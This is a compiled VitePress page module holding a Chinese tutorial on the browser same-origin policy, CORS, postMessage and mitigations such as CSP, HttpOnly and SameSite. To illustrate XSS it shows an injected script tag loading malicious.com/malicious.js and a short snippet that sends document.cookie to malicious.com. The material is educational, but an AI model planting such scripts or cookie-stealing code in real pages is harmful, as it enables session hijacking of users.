import{_ as s,c as e,o,ag as l}from"./chunks/framework.DPDPlp3K.js";const u=JSON.parse('{"title":"页面安全策略","description":"","frontmatter":{},"headers":[],"relativePath":"safe/同源策略.md","filePath":"safe/同源策略.md"}'),t={name:"safe/同源策略.md"};function n(p,a,i,r,c,h){return o(),e("div",null,a[0]||(a[0]=[l(`<h1 id="页面安全策略" tabindex="-1">页面安全策略 <a class="header-anchor" href="#页面安全策略" aria-label="Permalink to &quot;页面安全策略&quot;">​</a></h1><ul><li>同源策略</li><li>跨域资源共享策略</li><li>跨文档消息机制</li></ul><h2 id="同源策略-same-origin-policy" tabindex="-1">同源策略（Same-origin policy） <a class="header-anchor" href="#同源策略-same-origin-policy" aria-label="Permalink to &quot;同源策略（Same-origin policy）&quot;">​</a></h2><p>同源策略可以隔离各个站点之间的 DOM 交互、页面数据和网络通信，虽然严格的同源策略会带来更多的安全，但是也束缚了 Web。这就需要在安全和自由之间找到一个平衡点，所以默认页面中可以引用任意第三方资源，然后又引入 CSP 策略来加以限制；默认 XMLHttpRequest 和 Fetch 不能跨站请求资源，然后又通过 CORS 策略来支持其跨域。</p><p>不过支持页面中的第三方资源引用和 CORS 也带来了很多安全问题，其中最典型的就是 XSS 攻击。</p><h3 id="什么是同源策略" tabindex="-1">什么是同源策略 <a class="header-anchor" href="#什么是同源策略" aria-label="Permalink to &quot;什么是同源策略&quot;">​</a></h3><p><strong>如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。</strong></p><p>浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，因此把这称为同源策略。</p><p>同源策略主要表现在 DOM、Web 数据和网络这三个层面。</p><h4 id="_1-dom层面" tabindex="-1">1. DOM层面 <a class="header-anchor" href="#_1-dom层面" aria-label="Permalink to &quot;1. DOM层面&quot;">​</a></h4><p>同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。</p><h4 id="_2-数据层面" tabindex="-1">2. 数据层面 <a class="header-anchor" href="#_2-数据层面" aria-label="Permalink to &quot;2. 数据层面&quot;">​</a></h4><p>同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。由于同源策略，我们无法通过第二个页面的 opener 来访问第一个页面中的 Cookie、IndexDB 或者 LocalStorage 等内容。</p><h4 id="_3-网络层面" tabindex="-1">3. 网络层面 <a class="header-anchor" href="#_3-网络层面" aria-label="Permalink to &quot;3. 网络层面&quot;">​</a></h4><p>同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。</p><h3 id="同源策略产生什么问题" tabindex="-1">同源策略产生什么问题 <a class="header-anchor" href="#同源策略产生什么问题" aria-label="Permalink to &quot;同源策略产生什么问题&quot;">​</a></h3><ol><li>页面中可以嵌入第三方资源</li><li>跨域资源共享</li><li>跨文档消息机制</li></ol><h4 id="_1-页面中可以嵌入第三方资源" tabindex="-1">1. 页面中可以嵌入第三方资源 <a class="header-anchor" href="#_1-页面中可以嵌入第三方资源" aria-label="Permalink to &quot;1. 页面中可以嵌入第三方资源&quot;">​</a></h4><p>同源策略要求一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，因此来了诸多限制。</p><p>比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。</p><p>不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。</p><div class="language-html"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki github-light vp-code" tabindex="0"><code><span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">head</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">  &lt;</span><span style="color:#22863A;">script</span><span style="color:#6F42C1;"> src</span><span style="color:#24292E;">=</span><span style="color:#032F62;">&quot;http://malicious.com/malicious.js&quot;</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#D73A49;">&lt;/</span><span style="color:#24292E;">head</span><span style="color:#D73A49;">&gt;</span></span></code></pre></div><p>比如，恶意程序在 HTML 文件内容中插入如下一段 JavaScript 代码，当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。</p><p>除此之外，它还能将页面的的敏感数据，如 Cookie、IndexDB、LoacalStorage 等数据通过 XSS 的手段发送给服务器。</p><div class="language-js"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki github-light vp-code" tabindex="0"><code><span class="line"><span style="color:#D73A49;">function</span><span style="color:#6F42C1;"> onClick</span><span style="color:#24292E;">(){</span></span>
<span class="line"><span style="color:#D73A49;">  let</span><span style="color:#24292E;"> url </span><span style="color:#D73A49;">=</span><span style="color:#032F62;"> \`http://malicious.com?cookie = \${</span><span style="color:#24292E;">document</span><span style="color:#032F62;">.</span><span style="color:#24292E;">cookie</span><span style="color:#032F62;">}\`</span></span>
<span class="line"><span style="color:#6F42C1;">  open</span><span style="color:#24292E;">(url)</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#6F42C1;">onClick</span><span style="color:#24292E;">()</span></span></code></pre></div><p>在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。</p><p>以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了<strong>内容安全策略</strong>，称为 CSP。**CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。**通过这些手段就可以大大减少 XSS 攻击。</p><h4 id="_2-跨域资源共享" tabindex="-1">2. 跨域资源共享 <a class="header-anchor" href="#_2-跨域资源共享" aria-label="Permalink to &quot;2. 跨域资源共享&quot;">​</a></h4><p>默认情况下，如果打开极客邦的官网页面，在官网页面中通过 XMLHttpRequest 或者 Fetch 来请求 InfoQ 中的资源，这时同源策略会阻止其向 InfoQ 发出请求，这样会大大制约我们的生产力。</p><p>为了解决这个问题，所以引入了跨域资源共享（CORS），使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。</p><h4 id="_3-跨文档消息机制" tabindex="-1">3. 跨文档消息机制 <a class="header-anchor" href="#_3-跨文档消息机制" aria-label="Permalink to &quot;3. 跨文档消息机制&quot;">​</a></h4><p>如果两个页面不是同源的，则无法相互操纵 DOM。但在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中引入了跨文档消息机制，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。</p><hr><ul><li>页面中可以引用第三方资源，不过这也暴露了很多诸如 XSS 的安全问题，因此又在这种开放的基础之上引入了 CSP 来限制其自由程度。</li><li>使用 XMLHttpRequest 和 Fetch 都是无法直接进行跨域请求的，因此浏览器又在这种严格策略的基础之上引入了跨域资源共享策略，让其可以安全地进行跨域操作。</li><li>两个不同源的 DOM 是不能相互操纵的，因此，浏览器中又实现了跨文档消息机制，让其可以比较安全地通信。</li></ul><hr><p>页面安全问题的主要原因就是浏览器为同源策略开的两个“后门”：一个是在页面中可以任意引用第三方资源，另外一个是通过 CORS 策略让 XMLHttpRequest 和 Fetch 去跨域请求资源。</p><p>为了解决这些问题，我们引入了 CSP 来限制页面任意引入外部资源，引入了 HttpOnly 机制来禁止 XMLHttpRequest 或者 Fetch 发送一些关键 Cookie，引入了 SameSite 和 Origin 来防止 CSRF 攻击。</p>`,37)]))}const S=s(t,[["render",n]]);export{u as __pageData,S as default};
